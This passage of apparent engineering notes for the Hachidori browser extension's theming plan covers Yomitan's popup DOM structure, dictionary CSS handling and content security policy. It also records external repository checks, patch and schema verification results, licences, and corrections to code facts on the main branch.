- **Layout modes as data attributes.** `_updateDocumentOptions` (display.js:1256-1277) mirrors `resultOutputMode` (group/merge/split/term), `glossaryLayoutMode` (default/compact/compact-popup-anki), `compactTags`, `termDisplayMode`, `frequencyDisplayMode` and `popupDisplayMode` onto the root.
- **Dictionary CSS** is only rejected when empty at import (`dictionary-importer.js:529`) and is applied unsanitised. `sanitizeCSS` is used only for Anki and the local API.
- **No JS hooks or plugin API** (confirmed by grep). The popup renderer is fixed (`display-generator.js` + `templates-display.html`).
- **Plain text is DOM-based.** `_formatGlossaryPlain` / `_getText` (`templates/anki-template-renderer.js:637-651, 772-790`) regex-strip rendered HTML. Hachidori's `glossaryToPlainText` must walk the data (T-13).
- **Popup DOM a Yomitan renderer should emit (T-34):**
  - `div.entry[data-type=term]` > `.entry-header` (`.actions` `button.action-button[data-action=play-audio|menu]`, `.headword-list` > `.headword-term-outer > .headword-term`, `.headword-reading`)
  - `.entry-body` > `.entry-body-section[data-section-type=frequencies|pronunciations|definitions]` > `li.definition-item` > `.definition-tag-list` + `ul.gloss-list`
  - `span.tag > .tag-label > .tag-label-content`
  - `data-dictionary` on entry, definition, tag and frequency nodes
  - Both projects are GPL-3.0.
- **CSP** (`dev/data/manifest-variants.json:120-123`): extension pages `script-src 'self' 'wasm-unsafe-eval'`. The sandbox allows `'unsafe-eval'` for the Handlebars Anki renderer.

## 4. External checks (2026-09-28)

- Themes repository: `bee-san/hachidori-themes` was created 18:23 UTC (README + proposal issues #1–#10). `bee-san/hachidori-theme-store` does not exist yet, so T-04 renames the existing repository.
- Evidence branches (head · files under `docs/evidence/`):
  - store `5bfabe5` (67)
  - kanji-atlas `4f85713` (35)
  - learner-focus `8980005` (38)
  - manga-vertical `5e24e91` (35)
  - geocities-y2k `7cf61a5` (33)
  - retro-terminal `06d1014` (36)
  - tamagotchi-lcd `0ae6c67` (29)
  - rpg-dialogue `2511522` (26)
  - omikuji-shrine `c8fa180` (51)
  - denshi-jisho `40ffdef` (36)
  - sentence-context `17b3fb1` (31)
- Every file the original body names exists, except `hachidori-themes-skeleton/scripts/sanitize-css.mjs`, which `validate.mjs` imports.
- `host-prototype.patch`: `git apply --check` at 0ea6167 applies the manifest.json and reader-options.js hunks. The content.js hunk fails (drift from #338).
- Skeleton `theme.schema.json` does not compile under Ajv strict (`strictRequired`), reproduced with ajv 8.17.1 as c17 reported. The schemas in this package compile ([scripts/validate-examples.mjs](scripts/validate-examples.mjs)).
- wareya/nazeka @ `8b220fb` exists (`texthook.js`, 87,995 B). GitHub detects no licence; the readme states Apache-2.0.
- melink14/rikaikun @ `dd50b08` exists (`extension/css/popup.css`, 4,550 B; GPL-3.0).
- daisyUI: MIT. yomidevs/yomitan: GPL-3.0.
- Origin: [#330 comment 5800587085](https://github.com/bee-san/hachidori/issues/330#issuecomment-5800587085) (bee-san, 2026-09-23). #330 is closed ("issues10").
- Related open issues: #335 (compact default popup theme), #336 (dictionary images across palettes, forced-colors), #342 (frequency tags in the DOM with averaging). All three touch Default's CSS and DOM (open question 14).
- Chrome policy pages are quoted in [security.md](security.md).

## 5. Code facts re-verified on main 3c7e9df

See [architecture.md §3](architecture.md#3-hachidori-today-what-the-plan-changes). Corrections to the original body:

- Each palette block has **18** properties (17 colours + `color-scheme`) and matches `html[…]` as well as `:host(…)`.
- reader.css and icons.css are **one** constructed sheet.
- Dictionary styles are `<style>` elements in `@scope`, not adopted sheets.
- `overlay-mode.js:24` "hidden on Firefox" and every Firefox path are gone (#339).
- Content scripts now run in `all_frames` (#338).
- The shadow root is **open**, while docs say closed.
- `DESIGN_OPTION_KEYS` has 25 keys (`compactFrequencyNumbers` was added by #373), while docs say 19.
- `--gsm-hoshidicts-popup-columns` is never set: masonry reads the option in JS.
- The hover benchmark's probe depends on Default classes and content.js internals.
